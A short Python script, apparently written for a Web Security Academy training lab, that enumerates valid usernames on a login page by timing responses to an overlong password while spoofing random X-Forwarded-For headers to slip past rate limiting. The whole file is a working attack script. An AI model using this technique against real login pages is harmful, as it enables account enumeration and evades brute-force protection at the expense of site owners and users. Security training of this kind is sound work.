import requests
import re
import random
import time

with open("usernames.txt", "r") as username_file:
    usernames = [line.strip() for line in username_file]
   
header = {"X-Forwarded-For": str(random.randint(1, 100))+"."+str(random.randint(1, 100))+"."+str(random.randint(1, 100))+"."+str(random.randint(1, 100))}
data={ "username":"wiener", "password":"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"}
res1=time.time()
respuesta=requests.post("https://0a5d001b047f242c80518f5200ce0032.web-security-academy.net/login", headers=header, data=data)
res2=time.time()
res3=res2-res1
print("Ideal time: "+str(res3))

for i in usernames:
	header1 = {"X-Forwarded-For": str(random.randint(1, 100))+"."+str(random.randint(1, 100))+"."+str(random.randint(1, 100))+"."+str(random.randint(1, 100))}
	data1 = {'username': i, 'password': "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"}
	v0=time.time()
	respuesta1 = requests.post('https://0a5d001b047f242c80518f5200ce0032.web-security-academy.net/login', headers=header1, data=data1)
	v1=time.time()
	v2=v1-v0
	if v2 > res3*0.92 and v2 < res3*1.1:
		print("Possible Username: " + i.strip() + ", Tiempo de respuesta: " + str(v2))
